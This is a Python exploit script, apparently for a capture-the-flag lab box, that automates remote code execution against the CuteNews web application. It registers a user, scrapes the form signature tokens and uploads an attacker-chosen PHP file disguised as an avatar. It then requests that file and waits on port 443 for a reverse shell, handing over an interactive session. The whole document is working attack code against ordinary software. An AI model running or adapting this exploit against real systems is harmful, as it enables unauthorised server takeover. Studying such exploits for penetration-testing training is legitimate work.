#!/usr/bin/env python3

from pwn import *
import pdb
import re
import requests
import signal
import sys
import time
import threading

def def_handler(sig, frame):
  print("\n\n[!] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# time.sleep(10)

# python3 autopwn.py http://10.10.10.206/CuteNews/ usuario password cmd.php

if len(sys.argv) != 5:
  print(f"\n\n[!] Uso: python3 {sys.argv[0]} + http://10.10.10.206/CuteNews/ usuario password filename.php\n")
  sys.exit(1)

# CONSTS
mainUrl = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
lport = 443

registerUrl = f"{mainUrl}index.php?register"
getValuesUrl = f"{mainUrl}index.php?mod=main&opt=personal"
loginUrl = f"{mainUrl}index.php"
uploadsUrl = f"{mainUrl}uploads"

#Proxy
burp = { 'http': 'http://127.0.0.1:8080' }

# pdb.set_trace()

def registerUser():
  postData = {
    "action": "register",
    "regusername": f"{username}",
    "regnickname": f"{username}",
    "regpassword": f"{password}",
    "confirm": f"{password}",
    "regemail": f"{username}@{username}.com",
  }
  # pdb.set_trace()
  request = requests.post(registerUrl, data=postData)

def uploadFile():
  session = requests.session()

  postData = {
    'action': 'dologin',
    'username': f'{username}',
    'password': f'{password}',
  }

  response = session.post(loginUrl, data=postData)
  response = session.get(getValuesUrl)

  signatureKey = re.findall(r'name="__signature_key" value="(.*?)"', response.text)[0]
  signatureDsi = re.findall(r'name="__signature_dsi" value="(.*?)"', response.text)[0]

  postData = {
    'mod': 'main',
    'opt': 'personal',
    '__signature_key': signatureKey,
    '__signature_dsi': signatureDsi,
    'editpassword': '',
    'confirmpassword': '',
    'editnickname': f'{username}'
  }

  shellFile = open(filename, "r")

  content = shellFile.read()

  fileToUpload = {'avatar_file': (filename, content)}

  response = session.post(loginUrl, data=postData, files=fileToUpload)
  response = session.get(f"{uploadsUrl}/avatar_{username}_{filename}")

  

if __name__ == '__main__':
  registerUser()
  try:
    threading.Thread(target=uploadFile, args=()).start()
  except Exception as e:
    log.error(str(e))

  shell = listen(lport, timeout=20).wait_for_connection()
  shell.interactive()
